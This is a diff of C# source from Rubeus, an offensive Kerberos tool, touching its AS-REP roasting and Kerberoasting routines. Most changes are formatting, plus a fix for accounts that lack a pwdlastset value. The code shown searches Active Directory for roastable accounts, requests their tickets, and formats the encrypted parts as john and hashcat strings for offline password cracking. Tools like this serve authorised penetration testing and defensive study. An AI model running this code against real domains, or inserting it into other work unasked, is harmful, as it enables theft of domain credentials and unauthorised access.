@@ -39,7 +39,8 @@ namespace Rubeus
                 // if we have a username, domain, and DC specified, we don't need to search for users and can roast directly
                 GetASRepHash(userName, domain, domainController, format, outFile);
             }
-            else {
+            else
+            {
                 DirectoryEntry directoryObject = null;
                 DirectorySearcher userSearcher = null;
 
@@ -141,7 +142,8 @@ namespace Rubeus
                     if (ex.InnerException != null)
                     {
                         Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
-                    } else
+                    }
+                    else
                     {
                         Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                     }
@@ -158,7 +160,7 @@ namespace Rubeus
         public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "")
         {
             // roast AS-REPs for users without pre-authentication enabled
-            
+
             string dcIP = Networking.GetDCIP(domainController, true, domain);
             if (String.IsNullOrEmpty(dcIP)) { return; }
 
@@ -190,17 +192,17 @@ namespace Rubeus
                 repHash = repHash.Insert(32, "$");
 
                 string hashString = "";
-                if(format == "john")
+                if (format == "john")
                 {
                     hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
                 }
-                else if(format == "hashcat")
+                else if (format == "hashcat")
                 {
                     hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
                 }
                 else
                 {
-                  Console.WriteLine("Please provide a cracking format.");
+                    Console.WriteLine("Please provide a cracking format.");
                 }
 
                 if (!String.IsNullOrEmpty(outFile))
@@ -269,7 +271,7 @@ namespace Rubeus
                 Console.WriteLine("[*] NOTICE: AES hashes will be returned for AES-enabled accounts.");
                 Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n");
             }
-            
+
             if ((enterprise) && ((TGT == null) || ((String.IsNullOrEmpty(spn)) && (spns != null) && (spns.Count == 0))))
             {
                 Console.WriteLine("[X] To use Enterprise Principals, /spn or /spns has to be specified, along with either /ticket or /tgtdeleg");
@@ -311,12 +313,14 @@ namespace Rubeus
                     }
                 }
             }
-            else {
+            else
+            {
                 if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(OUName)) || (!String.IsNullOrEmpty(userName)))
                 {
                     if (!String.IsNullOrEmpty(userName))
                     {
-                        if (userName.Contains(",")) {
+                        if (userName.Contains(","))
+                        {
                             Console.WriteLine("[*] Target Users           : {0}", userName);
                         }
                         else
@@ -374,7 +378,8 @@ namespace Rubeus
                     if (ex.InnerException != null)
                     {
                         Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
-                    } else
+                    }
+                    else
                     {
                         Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                     }
@@ -410,13 +415,15 @@ namespace Rubeus
                 try
                 {
                     string userFilter = "";
+
                     if (!String.IsNullOrEmpty(userName))
                     {
                         if (userName.Contains(","))
                         {
                             // searching for multiple specified users, ensuring they're not disabled accounts
                             string userPart = "";
-                            foreach (string user in userName.Split(',')) {
+                            foreach (string user in userName.Split(','))
+                            {
                                 userPart += String.Format("(samAccountName={0})", user);
                             }
                             userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
@@ -489,11 +496,11 @@ namespace Rubeus
                         userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
                     }
 
-                    if(!String.IsNullOrEmpty(ldapFilter))
+                    if (!String.IsNullOrEmpty(ldapFilter))
                     {
                         userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                     }
-                    
+
                     userSearcher.Filter = userSearchFilter;
                 }
                 catch (Exception ex)
@@ -531,35 +538,47 @@ namespace Rubeus
                         string samAccountName = user.Properties["samAccountName"][0].ToString();
                         string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                         string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
-                        long lastPwdSet = (long)(user.Properties["pwdlastset"][0]);
-                        DateTime pwdLastSet = DateTime.FromFileTimeUtc(lastPwdSet);
+
+
+                        DateTime? pwdLastSet = null;
+                        if (user.Properties.Contains("pwdlastset"))
+                        {
+                            long lastPwdSet = (long)(user.Properties["pwdlastset"][0]);
+                            pwdLastSet = DateTime.FromFileTimeUtc(lastPwdSet);
+                        }
+
                         Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
                         if (user.Properties.Contains("msDS-SupportedEncryptionTypes"))
                         {
                             supportedETypes = (Interop.SUPPORTED_ETYPE)user.Properties["msDS-SupportedEncryptionTypes"][0];
                         }
 
-                        try
+                        if (!userETypes.ContainsKey(supportedETypes))
                         {
-                            if (!userETypes.ContainsKey(supportedETypes))
-                            {
-                                userETypes[supportedETypes] = 1;
-                            }
-                            else
-                            {
-                                userETypes[supportedETypes] = userETypes[supportedETypes] + 1;
-                            }
-                            int year = (int)pwdLastSet.Year;
-                            if (!userPWDsetYears.ContainsKey(year))
-                            {
-                                userPWDsetYears[year] = 1;
-                            }
-                            else
-                            {
-                                userPWDsetYears[year] = userPWDsetYears[year] + 1;
-                            }
+                            userETypes[supportedETypes] = 1;
                         }
-                        catch { }
+                        else
+                        {
+                            userETypes[supportedETypes] = userETypes[supportedETypes] + 1;
+                        }
+
+                        if (pwdLastSet == null)
+                        {
+                            // pwdLastSet == null with new accounts and
+                            // when a password is set to never expire
+                            if (!userPWDsetYears.ContainsKey(-1))
+                                userPWDsetYears[-1] = 1;
+                            else
+                                userPWDsetYears[-1] += 1;
+                        }
+                        else
+                        {
+                            int year = pwdLastSet.Value.Year;
+                            if (!userPWDsetYears.ContainsKey(year))
+                                userPWDsetYears[year] = 1;
+                            else
+                                userPWDsetYears[year] += 1;
+                        }
 
                         if (!userStats)
                         {
@@ -612,7 +631,7 @@ namespace Rubeus
                         Console.WriteLine();
 
                         // display stats about the users found
-                        foreach(var item in userETypes)
+                        foreach (var item in userETypes)
                         {
                             eTypeTable.AddRow(item.Key.ToString(), item.Value.ToString());
                         }
@@ -627,7 +646,7 @@ namespace Rubeus
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
+                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex);
                     return;
                 }
             }
@@ -667,14 +686,14 @@ namespace Rubeus
                 }
                 byte[] requestBytes = ticket.GetRequest();
 
-                if ( !((requestBytes[15] == 1) && (requestBytes[16] == 0)) )
+                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                 {
                     Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
                     return;
                 }
 
                 // ignore the GSSAPI frame
-                byte[] apReqBytes = new byte[requestBytes.Length-17];
+                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                 Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);
 
                 AsnElt apRep = AsnElt.Decode(apReqBytes);
@@ -692,7 +711,7 @@ namespace Rubeus
                     {
                         foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                         {
-                            if(elem2.TagValue == 3)
+                            if (elem2.TagValue == 3)
                             {
                                 foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                 {
@@ -705,22 +724,22 @@ namespace Rubeus
                                     {
                                         byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                         string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
-                                        string hash="";
-                                        
-                                        if ((encType==18) || (encType==17))
+                                        string hash = "";
+
+                                        if ((encType == 18) || (encType == 17))
                                         {
                                             //Ensure checksum is extracted from the end for aes keys
-                                            int checksumStart =cipherText.Length-24;
+                                            int checksumStart = cipherText.Length - 24;
                                             //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
-                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0,checksumStart));
+                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                         }
                                         //if encType==23
                                         else
                                         {
                                             hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                         }
-            
-	    				if (!String.IsNullOrEmpty(outFile))
+
+                                        if (!String.IsNullOrEmpty(outFile))
                                         {
                                             string outFilePath = Path.GetFullPath(outFile);
                                             try
@@ -823,7 +842,7 @@ namespace Rubeus
             string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
 
             string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);
-          
+
             string hash = "";
             //Aes needs to be treated differently, as the checksum is the last 24, not the first 32.
             if ((encType == 18) || (encType == 17))
@@ -837,8 +856,8 @@ namespace Rubeus
             {
                 hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
             }
-            
-	    if (!String.IsNullOrEmpty(outFile))
+
+            if (!String.IsNullOrEmpty(outFile))
             {
                 string outFilePath = Path.GetFullPath(outFile);
                 try
@@ -858,7 +877,7 @@ namespace Rubeus
             else
             {
                 bool header = false;
-                if (Rubeus.Program.wrapTickets) 
+                if (Rubeus.Program.wrapTickets)
                 {
                     foreach (string line in Helpers.Split(hash, 80))
                     {
